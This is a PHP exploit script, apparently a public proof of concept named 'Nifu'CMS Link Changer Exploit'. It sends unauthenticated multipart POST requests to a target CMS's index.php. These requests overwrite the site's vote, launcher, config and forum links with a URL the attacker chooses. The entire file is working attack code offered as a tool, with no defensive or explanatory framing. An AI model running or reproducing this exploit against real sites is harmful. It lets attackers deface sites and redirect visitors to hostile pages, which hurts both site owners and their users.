<?php
/*
!Nifu_Links
@HOST = 127.0.0.1 = Target HOST
@PORT = 80 = Target PORT
@PATH = / = CMS PATH
@LINK = http://www.dofus-exploit.com = New URL
*/
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
function http_send($host, $packet)
{
    if (!($sock = fsockopen($host, 80)))
        die("\n[-] No response from {$host}:80\n");
 
    fputs($sock, $packet);
    return stream_get_contents($sock);
}
function postit($host, $port, $path, $payload, $boundary)
{
$packet  = "POST {$path}index.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Type: multipart/form-data; boundary={$boundary}\r\n";
$packet .= "Content-Length: ".strlen($payload)."\r\n";
$packet .= "Connection: close\r\n\r\n{$payload}";

http_send($host,$packet);
}

print "\n+---------------------------------------------------------------+";
print "\n| Nifu'CMS Link Changer Exploit                                 |";
print "\n|                                        by The UnKn0wN         |";
print "\n+---------------------------------------------------------------+\n";

$HOST = $argv[1];
$PORT = $argv[2];
$PATH = $argv[3];
$LINK = $argv[4];

print"\n[*] Updating Vote link ...";
$boundary = "---------".str_replace(".", "", microtime());
$payload  = "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"rpg\"\r\n\r\n \r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"valeur\"\r\n\r\n{$LINK}\r\n";
$payload .= "--{$boundary}--\r\n";
postit($HOST,$PORT,$PATH,$payload, $boundary);
print"Done!";

print"\n[*] Updating Luncher link ...";
$boundary = "---------".str_replace(".", "", microtime());
$payload  = "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"luncher\"\r\n\r\n \r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"valeur\"\r\n\r\n{$LINK}\r\n";
$payload .= "--{$boundary}--\r\n";
postit($HOST,$PORT,$PATH,$payload, $boundary);
print"Done!";

print"\n[*] Updating Config link ...";
$boundary = "---------".str_replace(".", "", microtime());
$payload  = "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"config\"\r\n\r\n \r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"valeur\"\r\n\r\n{$LINK}\r\n";
$payload .= "--{$boundary}--\r\n";
postit($HOST,$PORT,$PATH,$payload, $boundary);
print"Done!";

print"\n[*] Updating Forum link ...";
$boundary = "---------".str_replace(".", "", microtime());
$payload  = "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"forum\"\r\n\r\n \r\n";
$payload .= "--{$boundary}\r\n";
$payload .= "Content-Disposition: form-data; name=\"valeur\"\r\n\r\n{$LINK}\r\n";
$payload .= "--{$boundary}--\r\n";
postit($HOST,$PORT,$PATH,$payload, $boundary);
print"Done!\n";


